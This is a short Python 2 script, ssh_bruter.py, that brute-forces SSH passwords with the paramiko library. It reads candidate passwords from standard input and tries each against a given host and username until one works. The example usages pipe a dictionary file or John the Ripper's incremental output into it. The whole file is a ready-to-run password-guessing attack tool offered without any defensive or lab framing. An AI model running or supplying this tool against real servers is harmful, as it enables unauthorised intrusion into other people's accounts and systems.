#!/usr/bin/env python2
#  pip install paramiko

#Example usages:
#  cat dict.txt|./ssh_bruter.py
#  john --incremental -stdout=8|./ssh_bruter.py
import paramiko
import socket
import sys

try:
	input=raw_input
except Exception:
	pass

#returns (INT,STR)
#  INT is either 1 fail, 0 success, or -1 error
#  STR is error string or success string
def ssh_login(server,username,password,timeout=10000,port=22):
	while True:
		try:
			conn=paramiko.SSHClient()
			conn.set_missing_host_key_policy(paramiko.AutoAddPolicy())
			conn.connect(server,port=port,username=username,password=password,timeout=timeout)
			return (0,'Success')
		except socket.error as error:
			continue
		except paramiko.SSHException as error:
			code=1
			if str(error)=='Error reading SSH protocol banner':
				code=-1
			return (code,str(error))

if __name__=='__main__':
	if len(sys.argv)<3:
		print('Usage: '+sys.argv[0]+' HOSTNAME USERNAME [PORT]')
		exit(1)
	port=22
	if len(sys.argv)>3:
		port=int(sys.argv[3])
	print('Starting ssh brute force')
	try:
		while True:
			password=input('')
			sys.stdout.write(password+'\t')
			sys.stdout.flush()
			test=ssh_login(sys.argv[1],sys.argv[2],password,0.2,port)
			sys.stdout.write(test[1]+'\n')
			sys.stdout.flush()
			if test[0]==0:
				exit(0)
			if test[0]==-1:
				exit(1)
	except KeyboardInterrupt:
		exit(1)
	except EOFError:
		exit(1)
	except Exception as error:
		print(error)
		exit(1)
